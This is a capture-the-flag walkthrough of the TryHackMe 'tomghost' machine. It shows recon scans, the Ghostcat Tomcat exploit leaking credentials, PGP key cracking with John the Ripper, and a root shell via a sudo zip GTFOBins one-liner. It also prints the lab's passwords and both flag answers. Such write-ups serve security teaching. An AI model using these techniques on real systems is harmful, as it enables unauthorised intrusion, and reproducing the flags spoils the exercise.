# tomghost

Discover recent vulnerabilities to attempt exploiting the system or accessing files that you shouldn't be able to view.

IP address: 10.10.204.127

## Nmap Scan
Run the following Nmap scan to gather information about open ports and services:

```
nmap -sC -sV -oN initial.log 10.10.204.127
```

The Nmap scan results show the following open ports and services:

- **22/tcp**: OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (SSH)
- **53/tcp**: tcpwrapped
- **8009/tcp**: Apache Jserv (Protocol v1.3)
- **8080/tcp**: Apache Tomcat 9.0.30 (HTTP)

## Task 1

Use the Nikto scanner to detect vulnerabilities on the HTTP service:

```
nikto -h http://10.10.204.127 | tee nikto.log
```

Based on the Nmap scan, we can see that Apache Tomcat 9.0.30 is running on port 8080. After researching vulnerabilities, I used a script (`vulnerability.py`) to exploit the service and obtain credentials (CVE-2020-1938). The script revealed the following:

```xml
<display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>
```

Using these credentials, I logged into the machine and retrieved the first flag from `/home/merlin/user.txt`. As the current user lacked root permissions, I investigated the `skyfuck` user to check for potential privilege escalation opportunities.

### Analyzing Files
In `/home/skyfuck`, I found two files: an encrypted PGP file and its associated key (protected by a password). To decrypt the file, I used John the Ripper:

```
/snap/john-the-ripper/current/run/gpg2john tryhackme.asc > hashes-for-john.txt
/snap/john-the-ripper/current/run/john --wordlist=/usr/share/wordlists/rockyou.txt hashes-for-john.txt
```

Output:
```
alexandru        (tryhackme)
```

After obtaining the password, I decrypted the file:

```
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

Decrypted credentials:
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

Using `merlin`'s credentials, I accessed the system via SSH. Upon investigation, I discovered that `merlin` could execute the `zip` binary with root privileges. Using GTFOBins, I escalated privileges to root:

```
sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Privilege escalation:

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

## Questions

1. Compromise this machine and obtain `user.txt`:
    > THM{GhostCat_1s_so_cr4sy}

2. Escalate privileges and obtain `root.txt`:  
    > THM{Z1P_1S_FAKE}
